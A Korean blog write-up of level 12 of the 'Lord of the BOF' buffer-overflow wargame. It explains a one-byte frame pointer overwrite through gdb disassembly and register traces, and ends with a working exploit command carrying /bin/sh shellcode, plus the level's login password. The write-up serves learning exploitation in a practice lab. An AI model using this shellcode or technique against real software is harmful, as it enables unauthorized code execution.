---
layout: post
title: "The Lord of the BOF - Level 12"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level12/1.jpg" | relative_url }}' alt='relative'>  

## 1) golem/cup of coffee 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level12/2.png" | relative_url }}' alt='relative'>  

힌트로 FPO라는 단어를 주었는 데,,, FPO는 무엇일까요?  

## 2) FPO란?  

Frame Pointer Overwrite로 SFP의 1byte를 overwrite하여 실행코드가 있는 주소로 eip를 변조하는 기법이다.  

``` c
void problem_child(char *src)
{
        char buffer[40];
        strncpy(buffer, src, 41);
        printf("%s\n", buffer);
} 
```

c언어 코드에서도 buffer 배열의 사이즈는 40 byte인데 strncpy 함수로 41 byte 길이의 문자열을 복사합니다.  
SFP의 마지막 바이트를 덮어 써서 공격자가 원하는 주소로 변경한 뒤 프로그램의 흐름을 변경하는 공격으로 보입니다.  

SFP의 마지막 한 바이트를 수정하기 위해 buffer 배열 다음에 dummy 공간 없이 바로 SFP가 위치하는 것으로 예상됩니다.  

## 3) darknight 프로그램의 스택 구조 확인하기  

darknight.c 소스코드를 컴파일하여 test 프로그램을 만들었습니다.  
그리고 test 프로그램을 gdb로 컴파일하여 스택에 구조를 살펴봤습니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/3.png" | relative_url }}' alt='relative'>  

``` bash
0x8048440 <problem_child>:      push   %ebp
0x8048441 <problem_child+1>:    mov    %ebp,%esp
0x8048443 <problem_child+3>:    sub    %esp,40
```

sub %esp, 40을 보면 buffer 배열의 크기만큼 스택을 할당하는 것을 볼 수 있습니다.  
그러면 이전에 예측한대로 buffer 배열과 SFP 사이에는 dummy 공간이 존재하지 않습니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/4.png" | relative_url }}' alt='relative'>  

darkknight 프로그램의 problem_child 함수가 종료하고 다시 main 함수로 돌아왔을 때 스택 구조는 위 그림과 같습니다.  
스택에는 buffer 배열의 주소가 저장되어 있으니 이 주소를 활용하면 buffer 배열의 주소를 특정하여 직접 입력하지 않아도 buffer 배열을 참조할 수 있습니다.  

## 4) 그러면 SFP 마지막 바이트에 어떤 값을 입력해야 프로그램 흐름을 변경할 수 있을까?  

우선 프로그램의 흐름을 변경하기 위해 call, leave, ret 명령어를 알아야 합니다.  

``` bash
0x8048499 <main+45>:    call   0x8048440 <problem_child>

0x8048469 <problem_child+41>:   leave
0x804846a <problem_child+42>:   ret
```

call, leave와 ret 명령어는 다음과 같은 명령을 수행합니다.  

``` bash
// call
push $eip
jmp addr

// leave
mov $esp, $ebp
pop $ebp

// ret 
pop $eip
jmp $eip
```


명령어에 대한 내용을 파악하였다면 이제 darknight 프로그램의 어셈블리어 코드를 분석해보겠습니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/5.png" | relative_url }}' alt='relative'>  

main에서 problem_child 함수를 호출하기 위해 call 명령어를 하고 나서 problem_child 함수가 함수 실행을 위한 지역 변수 메모리 할당 명령어를 수행한 뒤의 레지스터 값 정보입니다.  

``` bash 
0x8048499 <main+45>:    call   0x8048440 <problem_child>
0x8048440 <problem_child>:      push   %ebp
0x8048441 <problem_child+1>:    mov    %ebp,%esp
0x8048443 <problem_child+3>:    sub    %esp,40
``` 

즉, 위의 어셈블리어 코드 부분에 해당하는 명령어를 수행한 뒤 레지스터 값에 대한 정보입니다.  
esp 레지스터는 현재 스택이 가리키고 있는 위치를 저장하는 레지스터이고, ebp는 함수의 base 주소를 저장하는 레지스터입니다.  
여기서는 스택에서 problem_child 함수의 base 주소가 ebp 레지스터에 저장되어 있고, buffer 배열의 시작주소가 esp 레지스터에 저장되어 있습니다.  

esp 레지스터가 가리키는 주소(=buffer 배열의 시작 주소)에 저장된 값을 확인해보니 strncpy 함수가 실행되기 전이라 쓰레기 값이 저장되어 있습니다.  
SFP는 0xbffffb08이고 RET는 main 함수에서 problem_child 함수를 호출하고 난 다음의 코드 주소인 0x0804849e입니다.  

<hr>

<img data-action="zoom" src='{{ "assets/lob/level12/6.png" | relative_url }}' alt='relative'>  

problem_child 함수에서 strncpy 함수를 실행하고 나서 leave 명령어를 실행하기 전 레지스터 정보입니다.    

``` bash
0x8048446 <problem_child+6>:    push   41
...
0x8048450 <problem_child+16>:   call   0x8048374 <strncpy>
...
0x8048469 <problem_child+41>:   leave
```

이전과 비교해서 esp 레지스터와 ebp 레지스터에 변화는 없습니다.  
다만, buffer 배열에 실행시 입력해준 인자 값이 저장되어 있습니다.  
\x90(NOP) 40 byte와 'A' 1 byte를 입력해줘서 SFP 값이 0xbffffb08에서 0xbffffb41로 덮어 써졌습니다.  

<hr>

<img data-action="zoom" src='{{ "assets/lob/level12/7.png" | relative_url }}' alt='relative'>  

leave 명령어가 실행된 이후의 레지스터 정보입니다.  

``` bash
// leave
mov $esp, $ebp
pop $ebp
```

<img data-action="zoom" src='{{ "assets/lob/level12/8.png" | relative_url }}' alt='relative'>  

leave 명령어는 ebp 레지스터 값을 esp 레지스터에 저장하고 ebp 레지스터에 esp 레지스터가 가리키는 스택의 값을 저장합니다.  

이전에 ebp 레지스터 값이 0xbffffafc 이므로 esp 레지스터에는 0xbffffafc가 저장되고,  
esp 레지스터가 가리키는 주소에서 pop 하여 0xbffffafc 주소에 저장되어 있는 값을 ebp에 저장합니다.  

esp는 pop하면서 4 byte 이동하여 0xbffffb00 값을 저장하고, ebp는 0xbffffafc 위치에 저장된 0xbffffb41을 저장합니다.  

leave 명령어를 수행하고 나서 esp가 가리키는 값, 즉 0xbffffb00 주소에는 0x0804849e가 저장되어 있습니다.  
다음 ret 명령어를 수행하면서 0x0804849e가 eip 레지스터에 저장됩니다.   

<hr>

<img data-action="zoom" src='{{ "assets/lob/level12/9.png" | relative_url }}' alt='relative'>  

``` bash
// ret 
pop $eip
jmp $eip
```

pop $eip 명령을 수행하면서 esp 레지스터 값이 4 byte 증가하였고 eip 레지스터는 0xbffffb00에 저장된 0x0804849e가 저장되었습니다.  


이 과정을 도식화하면 아래 그림과 같습니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/11.png" | relative_url }}' alt='relative'>  

## 5) 공격 페이로드 입력하여 BOF 일으키기  

버퍼에 NOP과 쉘코드를 입력하고 마지막 바이트는 buffer 배열의 주소가 저장되어 있는 주소로 지정합니다.  
buffer 배열의 주소가 어느 주소에 저장되어 있는지 확인하기 위해 임의의 값을 넣고 프로그램을 실행시켜 봅니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/12.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level12/13.png" | relative_url }}' alt='relative'>  

여러 번 시도를 한 결과 41번째 byte에 '\x68'을 입력하면 problem_child 함수가 끝날 때 ebp에는 배열의 주소가 저장되어 있는 0xbffffa68 주소가 담기고, problem_child 함수가 종료하고 나서 main 함수가 끝날 때 leave 명령어로 ebp에 있던 0xbffffa68 주소가 esp에 담기고, ret 명령어로 esp가 가리키는 위치의 주소에 저장된 값을 eip가 저장하여 buffer 배열의 주소로 프로그램 흐름이 변경됩니다.  

``` bash
0x8048499 <main+45>:    call   0x8048440 <problem_child>
//0x8048440 <problem_child>:      push   %ebp
//0x8048441 <problem_child+1>:    mov    %ebp,%esp
//0x8048443 <problem_child+3>:    sub    %esp,40
...
0x8048469 <problem_child+41>:   leave
0x804846a <problem_child+42>:   ret
//0x804849e <main+50>:    add    %esp,4
0x80484a1 <main+53>:    leave
0x80484a2 <main+54>:    ret
```



<hr>

공격 페이로드를 darkknight 프로그램에 적용하여 실행해보면 test 프로그램과 스택에 저장되는 주소가 일치하지 않아 '\x68'로는 Segmentation fault가 발생합니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/14.png" | relative_url }}' alt='relative'>  

이 경우에서는 값을 변경하며 여러 번 시도하면 됩니다.  

<img data-action="zoom" src='{{ "assets/lob/level12/15.png" | relative_url }}' alt='relative'>  

``` bash
./darkknight `python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x48"*100'`
```

공격 페이로드에 '\xff'를 입력하면 '\x00'으로 인식하는 문제가 있어 공격 페이로드에는 '\xff'를 입력하지 않는 것이 좋습니다.  
bash2에서는 '\xff'를 정상적으로 인식한다고 하였으나 bash2를 실행한 뒤 '\xff'를 입력하였을 때도 '\x00'으로 인식하는 문제가 있었습니다.  

